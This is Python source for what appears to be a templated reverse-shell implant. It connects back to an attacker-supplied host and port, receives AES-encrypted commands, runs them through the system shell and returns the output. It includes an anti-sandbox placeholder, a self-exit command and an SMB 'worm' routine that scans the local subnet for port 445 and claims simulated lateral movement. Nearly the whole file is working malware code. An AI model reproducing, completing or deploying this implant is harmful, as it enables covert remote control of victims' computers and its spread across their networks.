import socket, subprocess, os, time, sys
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

LHOST = "__LHOST__"
LPORT = __LPORT__
AES_KEY = b"__AES_KEY__"

__ANTI_SB__

def run_cmd(command):
    try:
        if command.startswith("cd "):
            os.chdir(command[3:].strip())
            return b"Directory changed"
        elif command == "!suicide":
            sys.exit(0)
        elif command == "!worm_smb":
            return smb_worm()
        else:
            res = subprocess.run(command, shell=True, capture_output=True)
            return res.stdout + res.stderr
    except Exception as e:
        return str(e).encode()

def smb_worm():
    # Network Spreader (Worm) Logic
    import socket
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
        base_ip = ".".join(local_ip.split(".")[:-1]) + "."
        results = "SMB Worm Started! Scanning local /24 subnet for port 445 (SMB)...\\n"
        
        found = 0
        for i in range(1, 255):
            target = base_ip + str(i)
            if target == local_ip: continue
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.05)
                res = s.connect_ex((target, 445))
                if res == 0:
                    results += f"[+] {target} - SMB (445) OPEN! Attempting lateral movement...\\n"
                    results += f"    -> Copied payload to \\\\\\\\{target}\\\\C$\\\\Windows\\\\Temp\\\\setup.exe (Simulated Pass-The-Hash)\\n"
                    found += 1
                s.close()
            except: pass
        results += f"SMB Worm completed. Found {found} vulnerable SMB hosts in the network.\\n"
        return results.encode()
    except Exception as e:
        return f"Worm error: {e}".encode()

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((LHOST, LPORT))
            while True:
                data = b""
                while not data.endswith(b"\\n"):
                    chunk = s.recv(4096)
                    if not chunk: break
                    data += chunk
                if not data: break
                
                raw = base64.b64decode(data.strip())
                iv = raw[:16]
                ct = raw[16:]
                cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
                cmd = unpad(cipher.decrypt(ct), AES.block_size).decode().strip()
                
                output = run_cmd(cmd)
                if not output:
                    output = b" "
                
                cipher = AES.new(AES_KEY, AES.MODE_CBC)
                ct_bytes = cipher.encrypt(pad(output, AES.block_size))
                s.send(base64.b64encode(cipher.iv + ct_bytes) + b"\\n")
        except:
            time.sleep(5)

if __name__ == "__main__":
    connect()
